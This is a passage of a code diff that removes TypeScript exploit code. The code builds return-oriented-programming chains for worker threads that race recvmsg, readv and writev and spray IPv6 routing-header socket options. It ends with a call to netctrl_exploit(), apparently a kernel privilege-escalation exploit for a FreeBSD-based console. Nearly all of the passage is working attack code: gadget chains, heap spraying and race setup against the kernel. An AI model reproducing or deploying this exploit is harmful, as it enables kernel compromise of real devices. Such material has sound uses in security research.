-  if (!result.eq(0)) {
-    throw new Error('thr_new failed: ' + hex(result))
-  }
-  return read64(spawn_tid)
-}
-
-function iov_recvmsg_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
-  const rop: BigInt[] = []
-
-  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
-
-  const cpu_mask = malloc(0x10)
-  write16(cpu_mask, 1 << MAIN_CORE)
-
-  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(1))                        // CPU_WHICH_TID
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(BigInt_Error)   // id = -1 (current thread)
-  rop.push(gadgets.POP_RCX_RET)
-  rop.push(new BigInt(0x10))                     // setsize
-  rop.push(gadgets.POP_R8_RET)
-  rop.push(cpu_mask)
-  rop.push(cpuset_setaffinity_wrapper)
-
-  const rtprio_buf = malloc(4)
-  write16(rtprio_buf, PRI_REALTIME)
-  write16(rtprio_buf.add(2), MAIN_RTPRIO)
-
-  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(1))         // RTP_SET
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(rtprio_buf)
-  rop.push(rtprio_thread_wrapper)
-
-  // Signal ready - write 1 to ready_signal
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(ready_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_init = rop.length
-
-  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(run_fd)
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(signal_buf)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(1))
-  rop.push(read_wrapper)
-
-  // recvmsg(iov_sock_0, msg, 0)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(iov_sock_0))
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(msg)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(0))
-  rop.push(recvmsg_wrapper)
-
-  // Signal done - write 1 to deletion_signal
-  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
-  rop.push(done_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_end = rop.length
-  const loop_size = loop_end - loop_init
-  // It's gonna loop
-
-  return {
-    rop,
-    loop_size
-  }
-}
-
-function uio_readv_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
-  const rop: BigInt[] = []
-
-  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
-
-  const cpu_mask = malloc(0x10)
-  write16(cpu_mask, 1 << MAIN_CORE)
-
-  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(1))                        // CPU_WHICH_TID
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(BigInt_Error)   // id = -1 (current thread)
-  rop.push(gadgets.POP_RCX_RET)
-  rop.push(new BigInt(0x10))                     // setsize
-  rop.push(gadgets.POP_R8_RET)
-  rop.push(cpu_mask)
-  rop.push(cpuset_setaffinity_wrapper)
-
-  const rtprio_buf = malloc(4)
-  write16(rtprio_buf, PRI_REALTIME)
-  write16(rtprio_buf.add(2), MAIN_RTPRIO)
-
-  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(1))         // RTP_SET
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(rtprio_buf)
-  rop.push(rtprio_thread_wrapper)
-
-  // Signal ready - write 1 to ready_signal
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(ready_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_init = rop.length
-
-  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(run_fd)
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(signal_buf)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(1))
-  rop.push(read_wrapper)
-
-  // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(uio_sock_0))
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(uioIovWrite)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(UIO_IOV_NUM))
-  rop.push(readv_wrapper)
-
-  // Signal done - write 1 to deletion_signal
-  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
-  rop.push(done_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_end = rop.length
-  const loop_size = loop_end - loop_init
-  // It's gonna loop
-
-  return {
-    rop,
-    loop_size
-  }
-}
-
-function uio_writev_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
-  const rop: BigInt[] = []
-
-  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
-
-  const cpu_mask = malloc(0x10)
-  write16(cpu_mask, 1 << MAIN_CORE)
-
-  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(1))                        // CPU_WHICH_TID
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(BigInt_Error)   // id = -1 (current thread)
-  rop.push(gadgets.POP_RCX_RET)
-  rop.push(new BigInt(0x10))                     // setsize
-  rop.push(gadgets.POP_R8_RET)
-  rop.push(cpu_mask)
-  rop.push(cpuset_setaffinity_wrapper)
-
-  const rtprio_buf = malloc(4)
-  write16(rtprio_buf, PRI_REALTIME)
-  write16(rtprio_buf.add(2), MAIN_RTPRIO)
-
-  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(1))         // RTP_SET
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(rtprio_buf)
-  rop.push(rtprio_thread_wrapper)
-
-  // Signal ready - write 1 to ready_signal
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(ready_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_init = rop.length
-
-  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(run_fd)
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(signal_buf)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(1))
-  rop.push(read_wrapper)
-
-  // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(uio_sock_1))
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(uioIovRead)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(UIO_IOV_NUM))
-  rop.push(writev_wrapper)
-
-  // Signal done - write 1 to deletion_signal
-  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
-  rop.push(done_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_end = rop.length
-  const loop_size = loop_end - loop_init
-  // It's gonna loop
-
-  return {
-    rop,
-    loop_size
-  }
-}
-
-function ipv6_sock_spray_and_read_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
-  const rop: BigInt[] = []
-
-  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
-
-  const cpu_mask = malloc(0x10)
-  write16(cpu_mask, 1 << MAIN_CORE)
-
-  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(1))                        // CPU_WHICH_TID
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(BigInt_Error)   // id = -1 (current thread)
-  rop.push(gadgets.POP_RCX_RET)
-  rop.push(new BigInt(0x10))                     // setsize
-  rop.push(gadgets.POP_R8_RET)
-  rop.push(cpu_mask)
-  rop.push(cpuset_setaffinity_wrapper)
-
-  const rtprio_buf = malloc(4)
-  write16(rtprio_buf, PRI_REALTIME)
-  write16(rtprio_buf.add(2), MAIN_RTPRIO)
-
-  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(1))         // RTP_SET
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(rtprio_buf)
-  rop.push(rtprio_thread_wrapper)
-
-  // Signal ready - write 1 to ready_signal
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(ready_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  const loop_init = rop.length
-
-  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(run_fd)
-  rop.push(gadgets.POP_RSI_RET)
-  rop.push(signal_buf)
-  rop.push(gadgets.POP_RDX_RET)
-  rop.push(new BigInt(1))
-  rop.push(read_wrapper)
-
-  // Spray all sockets
-  for (let i = 0; i < ipv6_socks.length; i++) {
-    rop.push(gadgets.POP_RDI_RET)
-    rop.push(ipv6_socks[i])
-    rop.push(gadgets.POP_RSI_RET)
-    rop.push(new BigInt(IPPROTO_IPV6))
-    rop.push(gadgets.POP_RDX_RET)
-    rop.push(new BigInt(IPV6_RTHDR))
-    rop.push(gadgets.POP_RCX_RET)
-    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)) // Offset for socket i
-
-    // debug("");
-    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));
-
-    rop.push(gadgets.POP_R8_RET)
-    rop.push(new BigInt(spray_rthdr_len))
-    rop.push(setsockopt_wrapper)
-  }
-
-  // After spraying, read all sockets into buffer array
-  for (let i = 0; i < ipv6_socks.length; i++) {
-    rop.push(gadgets.POP_RDI_RET)
-    rop.push(ipv6_socks[i])
-    // debug("");
-    // debug("pushed sock: " + hex(ipv6_socks[i]));
-    rop.push(gadgets.POP_RSI_RET)
-    rop.push(new BigInt(IPPROTO_IPV6))
-    rop.push(gadgets.POP_RDX_RET)
-    rop.push(new BigInt(IPV6_RTHDR))
-    rop.push(gadgets.POP_RCX_RET)
-    rop.push(read_rthdr_rop.add(i * 8))  // Offset for socket i
-    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
-    rop.push(gadgets.POP_R8_RET)
-    rop.push(check_len)
-    rop.push(getsockopt_wrapper)
-  }
-
-  // Signal done - write 1 to deletion_signal
-  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
-  rop.push(done_signal)
-  rop.push(gadgets.POP_RAX_RET)
-  rop.push(new BigInt(1))
-  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-  // Exit
-  rop.push(gadgets.POP_RDI_RET)
-  rop.push(new BigInt(0))
-  rop.push(thr_exit_wrapper)
-
-  // It's gonna loop
-
-  return {
-    rop,
-    loop_size: 0// loop_size
-  }
-}
-
-netctrl_exploit()
-// cleanup();
